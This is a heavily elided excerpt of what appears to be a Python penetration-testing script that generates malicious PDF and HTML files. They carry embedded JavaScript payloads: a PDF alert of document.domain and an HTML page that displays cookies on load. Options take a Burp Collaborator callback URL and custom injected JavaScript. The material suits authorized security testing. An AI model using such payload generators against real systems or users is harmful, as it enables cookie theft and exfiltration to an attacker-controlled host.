...
def create_malpdf1(filename):
    with open(filename, "w") as file:
        ...
        2 0 obj
        <</S /JavaScript /JS (app.alert(document.domain))>> 
        trailer
        <</Root 1 0 R>>''')
...
def create_malhtml(filename):
    ...
    <body onload="showAlerts()">
        <h1>XSS Test</h1>
        <p>This page runs two alerts: one with the document's domain and another with the document's cookies.</p>
    </body>
    </html>'''
    with open(filename, "w") as file:
...
if __name__ == "__main__":
    ...
    parser.add_argument(
        ...
        help="Specify the Burp Collaborator URL (e.g., http://j0k5n3q0z33b616che08hbqfj6pxdo1d.oastify.com)")
    parser.add_argument(
    ...
    parser.add_argument(
        ...
        help="Specify your own JavaScript code (e.g., app.alert(document.domain))")
